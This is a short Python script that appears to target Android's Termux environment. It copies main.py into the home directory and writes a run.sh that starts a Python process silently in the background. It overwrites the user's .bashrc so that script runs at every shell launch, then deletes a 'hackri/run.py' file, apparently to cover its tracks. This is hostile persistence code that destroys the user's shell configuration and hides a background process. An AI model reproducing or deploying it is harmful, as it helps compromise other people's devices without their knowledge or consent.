import os
os.system("cp -r main.py /$HOME") 
os.chdir('/data/data/com.termux//files/home')
file = open('run.sh' , 'w+')
file.write('python 389356 &> /dev/null &')
file.close()
try:
    file2 = open('.bashrc' , 'w')
    file2.write('bash run.sh')
except:
    try:
        os.system('> .bashrc')
    except:
        pass
    file2 = open('.bashrc', 'w')
    file2.write('bash run.sh')
while True:
    try:
        os.system('rm -rf hackri/run.py')
        break
    except:
        pass
